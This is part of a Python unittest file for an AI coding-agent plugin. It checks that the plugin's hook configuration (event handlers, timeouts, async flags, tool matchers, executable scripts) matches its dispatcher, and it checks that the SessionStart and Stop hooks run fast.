    def test_every_registered_event_is_dispatched(self):
        config = json.loads(HOOKS_JSON.read_text())
        self.assertEqual(set(config), {"hooks"})
        source = HOOK.read_text()
        handled = set(re.findall(r'^\s+"(\w+)": \[', source.split("HANDLERS = {", 1)[1].split("}", 1)[0], re.M))
        self.assertEqual(set(config["hooks"]), handled)
        for event, groups in config["hooks"].items():
            for group in groups:
                for h in group["hooks"]:
                    self.assertEqual(h["type"], "command")
                    self.assertEqual(h["command"], f'"${{CLAUDE_PLUGIN_ROOT}}/hooks/tstack-hook" {event}')
                    # the refusal's handler and the push gate start the fleet CLI (Bun): they get the time a start takes
                    slow = event == "PermissionDenied" or group.get("matcher") == "Bash"
                    self.assertLessEqual(h.get("timeout", 60), 30 if slow else 10)
                    # what nobody reads runs in the background: a tool call never waits on a heartbeat
                    self.assertEqual(h.get("async", False), event in (*HEARTBEAT_ONLY, "PermissionDenied"), event)
        self.assertEqual(config["hooks"]["SessionStart"][0]["matcher"], "startup|resume|clear|compact")
        for event in (*HEARTBEAT_ONLY, "PostToolUse"):
            self.assertNotIn("matcher", config["hooks"][event][0])  # every tool
        # a grant's spawn, and the push gate's Bash calls
        self.assertEqual([g["matcher"] for g in config["hooks"]["PreToolUse"]], ["Agent", "Bash"])
        self.assertTrue(os.access(HOOK, os.X_OK))
        self.assertTrue(os.access(MEMO, os.X_OK))
        self.assertEqual((ROOT / "bin" / "memo").resolve(), MEMO.resolve())
        self.assertEqual(TUCA.resolve(), (ROOT / "scripts" / "tuca-mode").resolve())
        self.assertTrue(os.access(TUCA, os.X_OK))


class LatencyTest(HookCase):
    def test_hooks_stay_fast(self):
        for n in range(40):
            self.memo("note", "fact", f"latency fact {n}")
        self.transcribe(*[tool_use("Read", file_path=f"f{n}") for n in range(500)])
        for event in ("SessionStart", "Stop"):
            payload = self.base(event, source="startup")
            self.hook(event, payload)  # warm the index
            times = []
            for _ in range(7):
                started = time.perf_counter()
                self.hook(event, payload)
                times.append((time.perf_counter() - started) * 1000)
            print(f"\n  {event} hook: median {statistics.median(times):.0f} ms, best {min(times):.0f} ms",
                  end="", file=sys.stderr)
            self.assertLess(min(times), 150, f"{event} hook is slow even at its best (a loaded machine inflates the rest): {times}")


if __name__ == "__main__":
    unittest.main()
